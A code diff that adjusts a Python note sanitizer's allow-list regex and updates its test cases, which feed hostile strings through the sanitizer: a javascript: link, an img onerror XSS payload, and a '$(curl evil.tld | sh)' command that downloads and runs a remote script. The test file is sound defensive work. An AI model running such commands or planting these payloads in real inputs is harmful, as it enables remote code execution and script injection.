@@ -18,7 +18,7 @@ with a narrow contract, and the tests sitting right next to it.
 """
 import re
 
-ALLOWED = re.compile(r"[^A-Za-z0-9 .,!?'-]")
+ALLOWED = re.compile(r"[^A-Za-z0-9 .,!?'\u2019-]")
 
 
 def sanitize(note: str, cap: int = 100) -> str:
@@ -30,8 +30,11 @@ def sanitize(note: str, cap: int = 100) -> str:
 
 CASES = [
     ("[click](javascript:alert(1))", "clickjavascriptalert1"),
+    ("<img src=x onerror=go()>", "img srcx onerrorgo"),
     ("hello\\nworld", "hello"),
-    ("$(curl evil.tld | sh)", "curl evil.tld  sh"),
+    # note the single space: the allow-list strips the pipe, then the
+    # whitespace collapse closes the gap it left behind
+    ("$(curl evil.tld | sh)", "curl evil.tld sh"),
     ("A" * 300, "A" * 100),
     ("perfectly normal note!", "perfectly normal note!"),
 ]
